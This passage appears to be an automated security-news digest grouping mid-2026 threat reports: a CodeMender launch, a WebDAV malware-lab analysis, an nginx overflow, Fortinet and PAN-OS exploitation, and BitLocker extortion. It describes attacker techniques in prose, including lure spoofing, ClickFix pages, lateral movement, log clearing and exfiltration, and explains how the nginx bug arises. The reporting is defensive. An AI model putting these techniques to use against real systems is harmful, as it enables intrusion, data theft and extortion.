As adversarial AI threats accelerate attacks on code, security teams must counter them with machine-speed defenses that can automate code remediation and fight AI with AI. CodeMender is our managed code security agent, and starting today, we're bringing its code scanning and remediation capabilities directly to you in preview. CodeMender offers access to our generally available models via Gemini Enterprise Agent Platform , or it can be deployed as a core component of AI Threat Defense . CodeMender also aligns with our multi-model approach , so you can choose the right model to optimize for cost, speed, and deep scanning performance. It will support third-party frontier model options later this year. How to find and fix code vulnerabilities autonomously with Google CodeMender. Watch this overview of CodeMender in Gemini Enterprise Agent Platform. CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day risk. It examines and remediates exis
```

#### Full body

```
Security & Identity Now in preview: Find and fix software vulnerabilities with CodeMender July 21, 2026 Michael Gerstenhaber VP, Product Management, Gemini Enterprise Clemens Viernickel Director, Product Management, Cloud AI Try Gemini Enterprise Business Edition today The front door to AI in the workplace Try now As adversarial AI threats accelerate attacks on code, security teams must counter them with machine-speed defenses that can automate code remediation and fight AI with AI. CodeMender is our managed code security agent, and starting today, we're bringing its code scanning and remediation capabilities directly to you in preview. CodeMender offers access to our generally available models via Gemini Enterprise Agent Platform , or it can be deployed as a core component of AI Threat Defense . CodeMender also aligns with our multi-model approach , so you can choose the right model to optimize for cost, speed, and deep scanning performance. It will support third-party frontier model options later this year. Watch this overview of CodeMender in Gemini Enterprise Agent Platform. CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day risk. It examines and remediates existing code security issues without sacrificing development velocity by: Deploying the best-fit model . You can choose from multiple models to optimize for costs, speed, deep scanning, and coding performance. Automating machine-scale remediation . You can now eliminate remediation bottlenecks caused by manual verification and patching, while keeping developers in the loop. Prioritizing fixes by exploitability . You can run proof-of-concept exploits and execute simulations to verify that vulnerabilities in the code are exploitable, and prioritize resources on fixing the most critical issues first. Find and fix vulnerabilities with AI Born from Google DeepMind's pioneering AI research , CodeMender transforms vulnerability management from a manual bottleneck into an autonomous, high-speed system. Your developers and security practitioners can automatically scan software for flaws, verify them with executable exploits, and remediate them with tested code fixes. “At Salesforce, trust is our number one value, and protecting customer data means continually raising the bar for how we find, validate, and mitigate risks. CodeMender brings AI into a critical part of the security lifecycle by accelerating the path from validated vulnerability to tested fix. As AI reshapes the threat landscape, capabilities like this help strengthen resilience and give our customers the confidence to keep innovating,” said Iain Mulholland, CISO, Salesforce . "CodeMender consistently identified critical vulnerabilities that our other AI-enabled tools completely missed. It doesn't just find theoretical flaws — it proves the immediate risk and delivers targeted, validated fixes that secure our environment without disrupting core business logic," said Scott Ponte, head, Security Operations, Robinhood. "CodeMender is fast, comprehensive, and genuinely ambitious about closing the loop from detection to fix, enabling teams to secure their software supply chain without losing velocity," said Ashwin Kannan, principal AI engineer, Office of the CTO, Palo Alto Networks. How the CodeMender agent works We’ve fine-tuned CodeMender’s harness to be continuously updated with the latest Google DeepMind research, including the up-to-date agent skills, security tools, and system prompts. Operating in the secure-by-design Agent Platform, CodeMender is protected by enterprise-grade, built-in governance and security guardrails, including secure traffic routing through your VPC, data isolation and encryption, and zero retention of source code data. As an agent, it can integrate with existing continuous integration and continuous delivery (CI/CD) workflows, or run directly in local developer environments using a lightweight command-line interface (CLI) client. You can
```

#### Corroborating sources (3)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Now in preview: Find and fix software vulnerabilities with CodeMender
  - Published: 2026-07-21T15:00:00+00:00
  - Link: https://cloud.google.com/blog/products/identity-security/find-and-fix-software-vulnerabilities-with-codemender/
  - Summary: As adversarial AI threats accelerate attacks on code, security teams must counter them with machine-speed defenses that can automate code remediation and fight AI with AI. CodeMender is our managed code security agent, and starting today, we're bringing its code scanning and remediation capabilities directly to you in preview. CodeMender offers access to our generally available models via Gemini Enterprise Agent Platform , or it can be deployed as a core component of AI Threat Defense . CodeMender also aligns with our multi-model approach , so you can choose the right model to optimize for cost, speed, and deep scanning performance. It will support third-party frontier model options later this year. How to find and fix code vulnerabilities autonomously with Google CodeMender. Watch this overview of CodeMender in Gemini Enterprise Agent Platform. CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day risk. It examines and remediates exis
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Google Launches Gemini 3.5 Flash Cyber AI to Find and Fix Software Vulnerabilities
  - Published: 2026-07-21T15:09:28+00:00
  - Link: https://thehackernews.com/2026/07/google-launches-gemini-35-flash-cyber.html
  - Summary: Google's DeepMind on Tuesday announced the release of Gemini 3.5 Flash Cyber, a specialized artificial intelligence (AI) model built atop 3.5 Flash that's designed to discover, validate, and patch vulnerabilities quickly and efficiently. According to the tech giant, the model will be exclusively available to governments and trusted partners via CodeMender as part of a limited-access pilot
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - Title: Introducing Gemini 3.5 Flash Cyber
  - Published: 2026-07-17T15:00:11+00:00
  - Link: https://deepmind.google/blog/introducing-gemini-3-5-flash-cyber/
  - Summary: Google introduces Gemini 3.5 Flash Cyber, a lightweight cybersecurity model to find and patch vulnerabilities.

### Cluster dedbaa9f38 — score 16

- Title: From a Single Alert to 1,000 Files: Inside an Exposed WebDAV Malware Delivery Lab
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-07-20T13:00:00+00:00
- Link: https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- content_type: threat_research
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- content_type: threat_research
- confidence_tier: tier_1_offensive_research

#### Summary

```
Executive summary An MDR alert recently led our team to an exposed server that was doing more than hosting payloads. It was functioning as a fully operational malware delivery lab. Containing over 1,000 artifacts, the infrastructure served as a QA hub where attackers systematically tested delivery paths, social engineering lures, and WebDAV execution methods. Our analysis reveals an interesting shift in adversary operations: attackers are adopting generative AI to move beyond individual exploits and operate like modern software product teams. By leveraging LLMs for rapid lure generation, detailed README documentation, and automated testing, they are significantly accelerating their development cycle. This incident underscores the imperative of preemptive security. By unifying exposure management with detection and response, we did not just catch a single campaign; we gained visibility into the attacker’s entire delivery pipeline. Although the server hosted many malware samples, the mor
```

#### Full body

```
Back to Blog Threat Research From a Single Alert to 1,000 Files: Inside an Exposed WebDAV Malware Delivery Lab Anna Širokova | Jan Recinsky Jul 20, 2026 | Last updated on Jul 20, 2026 | 25 min read DISCOVER RAPID7 MDR Executive summary An MDR alert recently led our team to an exposed server that was doing more than hosting payloads. It was functioning as a fully operational malware delivery lab. Containing over 1,000 artifacts, the infrastructure served as a QA hub where attackers systematically tested delivery paths, social engineering lures, and WebDAV execution methods. Our analysis reveals an interesting shift in adversary operations: attackers are adopting generative AI to move beyond individual exploits and operate like modern software product teams. By leveraging LLMs for rapid lure generation, detailed README documentation, and automated testing, they are significantly accelerating their development cycle. This incident underscores the imperative of preemptive security. By unifying exposure management with detection and response, we did not just catch a single campaign; we gained visibility into the attacker’s entire delivery pipeline. Although the server hosted many malware samples, the more interesting find was the view into the attacker’s workflow. The exposed infrastructure showed how the operator tested delivery paths, packaged lures, staged payloads, and monitored delivery activity. All of it with the help of generative AI. Introduction: From MDR alert to attacker infrastructure The investigation started with an MDR alert after a user executed a file pulled from a WebDAV server using rundll32.exe . Telemetry showed the WebClient service starting, followed by davclnt.dll reaching out to a remote host to retrieve content. That initial hit led us to dig deeper into the delivery setup, which is how we ended up finding an exposed directory. It quickly became clear to us that the server wasn't just hosting files, but also was used as an active malware testing and delivery hub. Alongside payloads, we found bulk-generated shortcut lures, URL-based execution tests, ClickFix pages, WebDAV initialization scripts, droppers, spoofed filenames, and operator notes. At a high level, the 1,048 files clustered as follows: Category Files Functions and discoveries LNK delivery launchers 453 Bulk-generated shortcut lures using document themes, spoofed filenames, fake icons, and multiple execution paths Filename-spoofing QA 236 Tests for Unicode, double-extension, padding, and browser/Explorer rendering behavior URL/LOLBin execution tests 146 Experiments with signed Windows binaries, remote working directories, and WebDAV-style execution Encrypted droppers 89 Staged second-stage payloads and installer-style packages Alternative execution containers 24 search-ms , library-ms , .cpl , and related delivery containers Payload stubs and spoofed executables 21 Smaller loaders, decoys, and renamed binaries WebDAV scripts 17 Scripts intended to make WebDAV delivery more reliable on Windows systems Builder and operator notes 10 README files, test reports, mappings, and generation scripts ClickFix HTML lures 9 Browser-based social-engineering pages instructing users to run commands Miscellaneous files 6 Included documentation for the actor’s WebDAV delivery/admin panel Table 1: Breakdown of files recovered from the attacker’s delivery workspace Technical analysis and observed attacker behavior Attackers testing like a product team The open directory exposed the attacker’s payloads and testing process. The collection varied by function: some folders stored payloads, while others isolated individual delivery methods, including WebDAV, UNC paths, search-ms , library-ms , Control Panel items, and trusted Windows binaries. Several directories appeared to be QA areas for testing how lures are rendered in browsers and Windows Explorer. These tests included Unicode spoofing, right-to-left override (RTLO) characters, double extensions, and padding trick
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: From a Single Alert to 1,000 Files: Inside an Exposed WebDAV Malware Delivery Lab
  - Published: 2026-07-20T13:00:00+00:00
  - Link: https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis
  - Summary: Executive summary An MDR alert recently led our team to an exposed server that was doing more than hosting payloads. It was functioning as a fully operational malware delivery lab. Containing over 1,000 artifacts, the infrastructure served as a QA hub where attackers systematically tested delivery paths, social engineering lures, and WebDAV execution methods. Our analysis reveals an interesting shift in adversary operations: attackers are adopting generative AI to move beyond individual exploits and operate like modern software product teams. By leveraging LLMs for rapid lure generation, detailed README documentation, and automated testing, they are significantly accelerating their development cycle. This incident underscores the imperative of preemptive security. By unifying exposure management with detection and response, we did not just catch a single campaign; we gained visibility into the attacker’s entire delivery pipeline. Although the server hosted many malware samples, the mor

### Cluster b113399d07 — score 15

- Title: Critical NGINX Vulnerability Can Crash Workers and May Allow Remote Code Execution
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-19T20:42:49+00:00
- Link: https://thehackernews.com/2026/07/critical-nginx-vulnerability-can-crash.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-42533

#### Cluster taxonomy (union across members)
- threat_categories: ddos
- cve_ids: CVE-2026-42533
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ddos
- cve_ids: CVE-2026-42533
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
F5 has shipped fixes for a critical nginx flaw that lets a remote, unauthenticated attacker trigger a heap buffer overflow in the worker process with crafted HTTP requests. CVE-2026-42533 was patched on July 15 in nginx 1.30.4 (stable) and 1.31.3 (mainline), and in NGINX Plus 37.0.3.1; anyone on an earlier build should upgrade. Triggering it can crash or restart the worker, causing a denial of
```

#### Full body

```
Critical NGINX Vulnerability Can Crash Workers and May Allow Remote Code Execution  Swati Khandelwal  Jul 19, 2026 Vulnerability / Server Security F5 has shipped fixes for a critical nginx flaw that lets a remote, unauthenticated attacker trigger a heap buffer overflow in the worker process with crafted HTTP requests. CVE-2026-42533 was patched on July 15 in nginx 1.30.4 (stable) and 1.31.3 (mainline) , and in NGINX Plus 37.0.3.1; anyone on an earlier build should upgrade. Triggering it can crash or restart the worker, causing a denial of service; where ASLR is disabled or can be bypassed, F5 says it may also allow remote code execution. The overflow lives in nginx's script engine, the code that assembles strings from directives at request time. It only surfaces under a specific configuration: a regex-based map whose output variable is referenced in a string expression after a capture from an earlier regex match. Under that pattern the engine's two-pass evaluation comes apart. The first pass measures how many bytes the result needs and allocates a buffer to fit; the second pass writes the bytes in. Both read the same shared capture state, and evaluating the map's regex in between the two passes overwrites it. So the measuring pass sizes the buffer for the original capture, a reference like $1 from the location match, while the writing pass fills it from a different, attacker-sized one. The buffer is too small, and both the length and the content of the overrun come straight from the request. This does not hit every nginx server; exposure depends on the configuration, not just the version. F5's advisory lists the flaw as affecting NGINX Ingress Controller, Gateway Fabric, App Protect WAF, and Instance Manager alongside the core server and NGINX Plus, though at publication F5 had not listed fixed builds for those four products. F5 scores it 9.2 on CVSS v4 and 8.1 on the older v3.1 scale, and rates attack complexity high. Every nginx version from 0.9.6 through 1.31.2 is vulnerable, a range that reaches back to 2011, when map gained regex support. CVE-2026-42533 was reported to F5 independently by more than a dozen researchers; the vendor thanked them for "independently bringing this issue to our attention." nginx's own changelog credits the fix to Mufeed VH of Winfunc Research and to maintainer Maxim Dounin. One of the reporters, Stan Shaw , who publishes as cyberstan , put out a detailed writeup that goes further than the advisory. F5 conditions code execution on ASLR being disabled or bypassable, and Shaw's argument is that the flaw supplies the bypass itself. He told The Hacker News that the capture clobbering also runs in reverse: when the clobbered capture is smaller than the original, the oversized buffer hands back uninitialised heap data, and on a default Ubuntu 24.04 build a single unauthenticated GET recovers the addresses a payload needs. "A reader of the F5 advisory could reasonably conclude this is DoS-only on default systems. It is not," Shaw said. It is a stronger claim than F5 makes, one he says hit 10 out of 10 in his own testing, and he is withholding the exploitation details and a proof-of-concept for now, so no one can check it independently yet. The fix is to upgrade to nginx 1.30.4 or 1.31.3, or NGINX Plus 37.0.3.1. For anyone who cannot patch right away, F5's temporary mitigation is to switch affected regex maps to named captures, which Shaw says closes the main path and covers most configurations. But he told The Hacker News the mitigation leaves a narrower path open: a map that defines the same named group as the location regex reaches the same overflow through a second code path, which he confirmed with AddressSanitizer and which F5's advisory does not mention. "Upgrading to 1.30.4 / 1.31.3 is the only complete fix," he said. The exposure to grep for is narrow: a regex-based map whose variable appears in a string expression alongside a numbered capture ( $1 , $2 ) from an earlier regex, with the captur
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical NGINX Vulnerability Can Crash Workers and May Allow Remote Code Execution
  - Published: 2026-07-19T20:42:49+00:00
  - Link: https://thehackernews.com/2026/07/critical-nginx-vulnerability-can-crash.html
  - Summary: F5 has shipped fixes for a critical nginx flaw that lets a remote, unauthenticated attacker trigger a heap buffer overflow in the worker process with crafted HTTP requests. CVE-2026-42533 was patched on July 15 in nginx 1.30.4 (stable) and 1.31.3 (mainline), and in NGINX Plus 37.0.3.1; anyone on an earlier build should upgrade. Triggering it can crash or restart the worker, causing a denial of

### Cluster 3d70163861 — score 15

- Title: CISA Mandates Urgent Patch for Actively Exploited Critical Fortinet Vulnerabilities
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-07-17T09:45:00+00:00
- Link: https://www.infosecurity-magazine.com/news/cisa-urgent-patch-fortinet/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Fortinet

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, zero_day
- affected_industries: government
- affected_products: Fortinet, OpenAI/ChatGPT, WordPress
- cve_ids: CVE-2026-25089, CVE-2026-39808
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, active_exploitation
- affected_industries: government
- affected_products: Fortinet, WordPress, OpenAI/ChatGPT
- cve_ids: CVE-2026-39808, CVE-2026-25089
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
US government agencies have until July 19 to patch two critical Fortinet vulnerabilities
```

#### Full body

```
Infosecurity Magazine Home » News » CISA Mandates Urgent Patch for Actively Exploited Critical Fortinet Vulnerabilities CISA Mandates Urgent Patch for Actively Exploited Critical Fortinet Vulnerabilities News 17 July 2026 Written by Kevin Poireault Reporter , Infosecurity Magazine Follow @Kpoireault Connect on LinkedIn Two vulnerabilities affecting Fortinet’s malware analysis and detection FortiSandbox have been exploited in the wild, the US Cybersecurity and Infrastructure Security Agency (CISA) has warned. The vulnerabilities, tracked as CVE-2026-39808 and CVE-2026-25089 are both critical, with a severity rating (CVSS) of 9.1 each. CISA added both to its Known Exploited Vulnerabilities (KEV) catalog on July 16, suggesting evidence of observed exploitation in the wild. The agency urged rolling out patches across federal government by July 19. ForitSandbox Exploits Can Lead to Execute Rogue Commands CVE-2026-39808 was detected by Samuel de Lucas Maroto, a security researcher at KPMG Spain, and disclosed by Fortinet on April 14. It is an operating system (OS) command injection vulnerability affecting Fortinet’s FortiSandbox versions 4.4.0 to 4.4.8. When exploited, it allows an attacker to execute unauthorized code or commands via . Fortinet has released a patch in FortiSandbox version 4.4.9. The second bug, CVE-2026-25089, was initially identified by Adham El Karn, a security researcher within the Fortinet Product Security team, and was disclosed by the cybersecurity firm on June 9. It is an OS command injection vulnerability affecting Fortinet’s FortiSandbox versions 5.0.0 to 5.0.5, 4.4.0 to 4.4.8 and all 4.2 versions, FortiSandbox Cloud versions 5.0.4 to 5.0.5 and FortiSandbox PaaS versions 5.0.4 to 5.0.5. When exploited, it allows an unauthenticated attacker to execute unauthorized commands via specifically crafted HTTP requests. Fortinet has released a patch in FortiSandbox versions 4.4.9 and 5.0.6. CISA required US federal agencies to apply mitigations and patches released by Fortinet. For cloud-based services, agencies should discontinue using the product if mitigations are unavailable. CISA has not confirmed whether these vulnerabilities have been used in ransomware campaigns. Image credits: Piotr Swat / bluestork / Shutterstock.com You may also like Researchers Build WordPress Exploit Using OpenAI's GPT News 20 July 2026 Researcher Behind 'Exploitarium' Explains Release of Undisclosed Zero-Day Exploits News 2 July 2026 AWS Unveils 'Continuum,' an AI-Powered Vulnerability Management Platform News 19 June 2026 Google Releases Patch for Chrome Vulnerability Exploited in the Wild News 9 June 2026 Infosecurity Europe: Patch Responsibility Remains Up for Grabs as AI Unearths Decades of Flaws News 3 June 2026 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Ubuntu snap-confine Vulnerability Enables Local Root Access News 22 July 2026 1 Google Makes CodeMender Available as Managed AI Security Agent News 22 July 2026 2 Researchers Build WordPress Exploit Using OpenAI's GPT News 20 July 2026 3 Ferrari Cybersecurity Head on Defending Formula 1’s Most Iconic Team Interview 20 July 2026 4 CISA Mandates Urgent Patch for Actively Exploited Critical Fortinet Vulnerabilities News 17 July 2026 5 macOS Flaw Lets Standard Users Disable EDR and MDM News 25 June 2026 6 Cybersecurity’s Economics Are Broken. Automation Alone Won’t Fix It Opinion 17 July 2026 1 Single Prompt Enables ChatGPT to Execute Full Cyber-Attack Chain, Researchers Claim News 16 July 2026 2 Researchers Build WordPress Exploit Using OpenAI's GPT News 20 July 2026 3 New AI Security Charter Backed by Over 70 Cyber Firms News 9 July 2026 4 JadePuffer Returns With Ransomware Designed to Wipe AI Models News 20 July 2026 5 Compromised Logins Surge as the Most Common Entry Point for Ransomware Attacks News 15 July 2026 6 68% of Businesses Say Employees Are Their Biggest Cyber Threat. Now What? Webinar 15:00 — 16:00, 16 July 2026 1 Same Front Door, New Visi
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: CISA Mandates Urgent Patch for Actively Exploited Critical Fortinet Vulnerabilities
  - Published: 2026-07-17T09:45:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/cisa-urgent-patch-fortinet/
  - Summary: US government agencies have until July 19 to patch two critical Fortinet vulnerabilities

### Cluster 31d26a81e9 — score 14

- Title: A new extortion cocktail: office printers, small ransoms, and BitLocker
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-07-21T13:00:29+00:00
- Link: https://securelist.com/new-extortion-scheme-printers-bitlocker/120718/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Microsoft BitLocker

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: financial_services
- affected_products: Microsoft BitLocker
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: financial_services
- affected_products: Microsoft BitLocker
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Summary

```
We cover two recent cases of BitLocker extortion using RDP, MSSQL, RMM tools, web shells, and printers. The story includes TTPs and recommendations.
```

#### Full body

```
Table of Contents Initial sign of an attack First case: abusing RDP to encrypt data Second case: meet the XEntry Team Conclusions Detection signatures Authors Eduardo Ovalle Recently, our teams in Latin America investigated a series of incidents involving misconfiguration, the deployment of BitLocker, and the exploitation of corporate printers. Attackers used the devices to notify organizations that their infrastructure had been compromised and they had to pay a ransom to recover their data. This article analyzes two incidents that occurred in June in Colombia and in May in Mexico. We highlight the similarities in the attackers’ communications and outline emerging trends in ransom amounts. Initial sign of an attack In both cases, the affected users initially noticed a padlock icon next to their drives in Windows Explorer. This indicated that the drive was encrypted with BitLocker, blocking access to its contents. Drive icon indicating that the drive is locked A recovery key was required to unlock the drive. Attempt to access the disk’s contents and the prompt for the BitLocker recovery key This is not the first time we have seen such threats; a few years ago, our team discovered a threat known as ShrinkLocker , which utilized BitLocker to achieve its goals. First case: abusing RDP to encrypt data One of the incidents occurred in Colombia in June. The attackers exploited an internet-exposed RDP service on a machine connected to an 8 TB storage device containing mission-critical data. After taking control of the system and manipulating user credentials, the attackers enabled BitLocker exclusively on the drive that primarily stored financial data. Once the encryption was complete, they locked the drive and used the company’s printers to produce ransom notes. Ransomware note Unfortunately, it was not possible to obtain evidence in the case due to the company’s rush to restore the encrypted disk. The communication with the attackers revealed a demand for just $3,000, and the company considered paying the ransom. After that, the system was restored before the forensic team could take any action, eliminating the evidence needed to assess the incident. Attacker’s reply to the victim’s email sent to the address in the printed ransom note This attack was made possible by an internet-facing remote desktop service (RDP) with additional open ports, which employees used to access corporate information. By exploiting this network exposure and misconfiguration, attackers breached the system, identified an additional drive, and leveraged BitLocker to encrypt the data and demand a ransom payment. Leaving RDP ports open without proper security controls jeopardizes the security of systems and information, as highlighted in the our “ Global Report: Anatomy of a Cyber World “. Exposed ports identified in the system in recent months The company confirmed that, due to compatibility issues with applications required for operation, EPP (Endpoint Protection Platform) protection was disabled on the system, making it easier for attackers to validate, enumerate, and execute applications without revealing malicious activity to central monitoring systems. Second case: meet the XEntry Team In another incident, which occurred in Mexico in May, our team identified how the threat actor gained initial access to the infrastructure. They exploited a misconfigured MSSQL service. This allowed them to execute commands on the system after obtaining the database login credentials from code insecurely published on GitHub. XEntry team attack In this incident, the attack began three months prior to detection, with the intruder discovering and verifying their access to the environment. After confirming their access and privilege level within the MSSQL server settings, which extended beyond the DBMS to the underlying operating system, the attackers initially focused on manipulating certain aspects of the web server configuration on the same system. They lowered the server’s
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: A new extortion cocktail: office printers, small ransoms, and BitLocker
  - Published: 2026-07-21T13:00:29+00:00
  - Link: https://securelist.com/new-extortion-scheme-printers-bitlocker/120718/
  - Summary: We cover two recent cases of BitLocker extortion using RDP, MSSQL, RMM tools, web shells, and printers. The story includes TTPs and recommendations.

### Cluster 0e52963d05 — score 14

- Title: Why Exposure Management Is Replacing Vulnerability Management
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-07-21T17:47:25+00:00
- Link: https://horizon3.ai/intelligence/blogs/exposure-vs-vulnerability-management/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Traditional vulnerability management tells you what is broken. Exposure management reveals what attackers can actually exploit. Learn why security leaders are shifting from vulnerability counts to measurable exposure reduction.
```

#### Full body

```
Why Exposure Management Is Replacing Vulnerability Management Stephen Gates July 21, 2026 Blogs Visibility Isn’t the Problem Vulnerability management isn’t failing because security teams lack visibility. Most organizations already have more findings than they can reasonably address. Yet despite all those findings, many CISOs still struggle to answer a deceptively simple question: Are we actually becoming harder to attack? That question sits at the center of a growing problem. Security programs have become very good at finding issues, but finding issues and reducing risk are not the same thing. In many organizations, those two concepts have become interchangeable, which is exactly why traditional vulnerability management is beginning to break down. The underlying assumption behind vulnerability management is straightforward. If you can identify vulnerabilities, prioritize them, and patch them, risk should decrease. That logic worked reasonably well when environments were smaller, infrastructure changed at a slower pace, and vulnerabilities were treated as the primary indicator of risk. Today’s environments operate differently. Vulnerabilities are rarely encountered in isolation and are often only one component of a broader security problem. The challenge is no longer finding vulnerabilities. The challenge is understanding exposure. This shift is one reason the Gartner® Continuous Threat Exposure Management (CTEM) framework has gained traction. At its core, the framework recognizes that understanding risk requires looking beyond individual vulnerabilities and evaluating the broader exposures that attackers can actually exploit. Why Prioritization Keeps Falling Short The challenge becomes apparent when organizations try to prioritize risk. Traditional vulnerability management evaluates findings individually, often using severity scores as a proxy for risk. Attackers take a different approach. They evaluate how weaknesses connect, what access they provide, and how they can be combined to reach a meaningful objective. That distinction matters because severity and risk are not the same thing. A critical vulnerability that cannot be reached or exploited may represent very little practical risk. Meanwhile, a lower-severity issue combined with weak credentials, excessive permissions, or a misconfigured identity relationship can create a direct path to sensitive systems and data. Attackers understand this instinctively. They do not attack vulnerabilities one at a time. They chain weaknesses together, move laterally across environments, escalate privileges, and pursue the path that gets them closest to their objective. Severity Is Not Risk One of the biggest reasons vulnerability management struggles today is that severity has become a stand-in for risk. It is easy to understand why. Severity scores provide a standardized way to compare findings, helping teams sort large volumes of vulnerabilities and establish remediation priorities. A vulnerability only matters if it contributes to an attacker’s ability to achieve an objective, whether that objective is accessing sensitive data, escalating privileges, or moving laterally through an environment. In every case, the question is not, “How severe is this vulnerability?” but rather, “Can this weakness be used as part of a path to something valuable?” Those are fundamentally different questions. One measures the characteristics of a finding. The other evaluates the opportunity it creates for an attacker. As environments become more interconnected, the gap between those perspectives continues to grow. Exposure Is Bigger Than Vulnerabilities Visibility tells you what vulnerabilities exist. Exposure tells you how attackers can use them. That distinction is becoming increasingly important because exposure is broader than a vulnerability. It includes the relationships between weaknesses, identities, permissions, assets, trust relationships, and business systems that create opportunities for attack
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Why Exposure Management Is Replacing Vulnerability Management
  - Published: 2026-07-21T17:47:25+00:00
  - Link: https://horizon3.ai/intelligence/blogs/exposure-vs-vulnerability-management/
  - Summary: Traditional vulnerability management tells you what is broken. Exposure management reveals what attackers can actually exploit. Learn why security leaders are shifting from vulnerability counts to measurable exposure reduction.

### Cluster 17b63d385b — score 14

- Title: Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-21T14:04:57+00:00
- Link: https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-0257, Palo Alto Networks

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion, zero_day
- actor_attribution: ShinyHunters
- affected_products: Microsoft Entra, Palo Alto Networks, Salesforce
- cve_ids: CVE-2026-0257
- urgency_signals: poc_available, preauth_unauth, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, zero_day
- actor_attribution: ShinyHunters
- affected_products: Salesforce, Palo Alto Networks, Microsoft Entra
- cve_ids: CVE-2026-0257
- urgency_signals: zero_day, preauth_unauth, poc_available
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway
```

#### Full body

```
Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access  Ravie Lakshmanan  Jul 21, 2026 Vulnerability / Network Security Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway components of PAN-OS software. Successful exploitation of the flaw allows unauthenticated remote attackers to sidestep authentication and establish VPN sessions without valid credentials when authentication override cookies are enabled with specific certificate configurations. "Post-exploitation tradecraft varied across intrusions, from rapid encryption-only operations to full double-extortion, possibly suggesting multiple affiliates operating under the Qilin ransomware-as-a-service (RaaS) umbrella," the cybersecurity company said . "Attackers demonstrated consistent operational patterns despite tradecraft variation: staging ransomware at C:\PerfLogs\, using PsExec for lateral execution via administrative shares, deploying password-protected ransomware payloads, and implementing comprehensive log-clearing routines." The threat actors have been found to weaponize the flaw to gain authenticated access to victim networks by establishing SSL VPN sessions, followed by escalating their attacks to facilitate credential harvesting and lateral movement through Windows administrative shares via compromised administrative accounts. The activity is also characterized by the attackers taking deliberate steps to clear event logs and disable Microsoft Defender Real-Time Protection prior to running the ransomware payload so as to minimize the likelihood of detection and avoid leaving forensic evidence. Despite similarities in ransomware staging paths, PsExec-based execution, and an unusual Windows Registry persistence pattern (i.e., an asterisk followed by six randomized lowercase alphabetic characters), follow-on attacks varied across victims. This ranged from enterprise-wide encryption with no data exfiltration and extensive reconnaissance via remote access tools like AnyDesk, Ngrok, or LogMeIn to large-scale credential theft and instances of data exfiltration to the MEGA cloud service before ransomware deployment using Rclone, Proton Drive, and FileZilla. "This variability is consistent with RaaS models, in which multiple affiliates may leverage shared initial access infrastructure and ransomware tooling while applying their own preferred post-exploitation methodologies," Arctic Wolf said. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      